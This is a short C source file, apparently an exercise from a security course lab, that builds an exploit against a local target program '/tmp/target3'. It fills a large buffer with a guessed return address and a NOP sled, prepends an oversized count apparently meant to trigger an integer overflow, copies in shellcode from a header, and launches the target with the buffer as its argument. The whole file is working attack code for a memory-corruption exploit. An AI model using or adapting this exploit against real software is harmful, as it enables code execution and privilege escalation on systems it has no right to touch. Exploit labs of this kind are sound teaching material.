#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP '\x90'

int main(void)
{
  char buffer[42896];
  char *args[3];
  char *env[1];
  int *addr = (int *) buffer;
  for (int i = 0; i < 42896/4; i+=1){  
      *(addr+i) = (int *) 0xbffeafe0;
  }

  for (int i = 0; i < 128 ; i++){
    buffer[i] = NOP; 
  }


  char count[] = " 2147484318";
  for (int i = 0; i < 11; i++){
    buffer[i] = count[i];
  }

  buffer[11] = ',';

  for (int i = 0; i < strlen(shellcode); i++){
    buffer[128 + i] = shellcode[i];
  }

 
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
